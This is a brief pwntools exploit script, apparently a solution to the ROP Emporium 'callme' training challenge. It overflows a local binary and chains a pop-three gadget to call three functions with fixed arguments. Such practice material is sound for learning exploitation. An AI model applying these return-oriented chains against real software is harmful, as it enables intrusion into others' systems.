#!/usr/bin/python 
from pwn import *

p = process("./callme")
elf = ELF("./callme")
libc = elf.libc 
p3ret = 0x401ab0

pay = 'A'*(0x20+0x8)
pay += p64(p3ret) + p64(1) + p64(2) + p64(3) + p64(elf.plt['callme_one'])
pay += p64(p3ret) + p64(1) + p64(2) + p64(3) + p64(elf.plt['callme_two'])
pay += p64(p3ret) + p64(1) + p64(2) + p64(3) + p64(elf.plt['callme_three'])

p.sendlineafter("> ", pay)

p.interactive()
